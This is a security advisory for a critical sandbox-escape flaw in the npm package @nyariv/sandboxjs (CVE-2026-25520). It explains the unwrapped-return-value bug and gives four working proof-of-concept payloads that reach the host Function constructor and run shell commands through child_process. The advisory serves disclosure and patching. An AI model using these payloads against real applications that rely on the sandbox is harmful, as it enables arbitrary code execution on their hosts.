# [C] @nyariv/sandboxjs has a Sandbox Escape issue

## Summary
Severity: Critical
Advisory: GHSA-58jh-xv4v-pcx4
CVE: CVE-2026-25520
CWE: CWE-74
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-05
Source: https://github.com/advisories/GHSA-58jh-xv4v-pcx4
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.29

## Details
### Summary

The return values of functions aren't wrapped. `Object.values`/`Object.entries` can be used to get an Array containing the host's `Function` constructor, by using `Array.prototype.at` you can obtain the hosts `Function` constructor, which can be used to execute arbitrary code outside of the sandbox.

### Details

The return values of functions aren't wrapped, chaining function calls allows bypassing most validation/sanitization. 

### PoC

```js
const s = require('@nyariv/sandboxjs').default;
const sb = new s();

payload = `
console.log(
  Object.values(this).at(0)(
    "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
  )(),
);
`

sb.compile(payload)().run();
```

```js
const s = require("@nyariv/sandboxjs").default;
const sb = new s();

payload = `
console.log(
  Object.entries(this)[0].at(1)(
    "return process.getBuiltinModule('child_process').execSync('ls -lah').toString()",
  )(),
);
`

sb.compile(payload)().run();
```

```js
const s = require("@nyariv/sandboxjs").default;
const sb = new s();

payload = `
console.log(
  Object.entries(this)
    .at(0)
    .map((f) => {
      if (typeof f === 'function') {
        f.call('', 'return process')()
          .getBuiltinModule('child_process')
          .execSync('ls -lah', { stdio: 'inherit' });
      }
    }),
);
`

sb.compile(payload)().run();
```

```js
const s = require("@nyariv/sandboxjs").default;
const sb = new s();

payload = `
const t = (f) => {
  f.call('', 'return process')()
    .getBuiltinModule('child_process')
    .execSync('ls -lah', { stdio: 'inherit' });
};
console.log(t.call(...Object.entries(this)[0]));
`

sb.compile(payload)().run();
```

### Impact

Sanbox Escape -> RCE

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-58jh-xv4v-pcx4
- https://nvd.nist.gov/vuln/detail/CVE-2026-25520
- https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3
- https://github.com/nyariv/SandboxJS
